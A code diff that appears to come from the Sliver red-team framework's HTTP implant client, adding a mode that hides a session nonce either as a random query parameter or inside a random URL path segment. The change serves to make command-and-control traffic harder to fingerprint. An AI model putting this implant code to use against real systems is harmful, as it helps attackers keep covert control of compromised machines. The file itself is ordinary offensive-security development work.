@@ -29,6 +29,7 @@ import (
 	insecureRand "math/rand"
 	"net/http"
 	"net/url"
+	"path"
 	"strconv"
 	"strings"
 	"sync"
@@ -51,6 +52,7 @@ var (
 	userAgent          = "{{GenerateUserAgent}}"
 	NonceQueryArgChars = "{{.HTTPC2ImplantConfig.NonceQueryArgChars}}" // "abcdefghijklmnopqrstuvwxyz"
 	NonceQueryLength   = "{{.HTTPC2ImplantConfig.NonceQueryLength}}"   // 8
+	NonceMode          = "{{.HTTPC2ImplantConfig.NonceMode}}"          // Url or UrlParam
 
 	ErrClosed                             = errors.New("http session closed")
 	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
@@ -197,21 +199,35 @@ func (s *SliverHTTPClient) SessionInit() error {
 
 // NonceQueryArgument - Adds a nonce query argument to the URL
 func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
-	values := uri.Query()
-	var key string
-	length, _ := strconv.Atoi(NonceQueryLength)
-	for i := 0; i < length; i++ {
-		key += string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
-	}
 	argValue := fmt.Sprintf("%d", value)
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(argValue))
 		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
 		argValue = argValue[:index] + char + argValue[index:]
 	}
-	values.Add(string(key), argValue)
-	uri.RawQuery = values.Encode()
-	return uri
+
+	if NonceMode == "UrlParam" {
+		values := uri.Query()
+		var key string
+		length, _ := strconv.Atoi(NonceQueryLength)
+		for i := 0; i < length; i++ {
+			key += string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+		}
+
+		values.Add(string(key), argValue)
+		uri.RawQuery = values.Encode()
+		return uri
+	} else {
+		segments := strings.Split(uri.Path, "/")
+		extension := path.Ext(segments[len(segments)-1])
+		index := insecureRand.Intn(len(segments))
+		segments[index] = argValue
+		if index == len(segments)-1 {
+			segments[index] += extension
+		}
+		uri.Path = strings.Join(segments, "/")
+		return uri
+	}
 }
 
 // OTPQueryArgument - Adds an OTP query argument to the URL
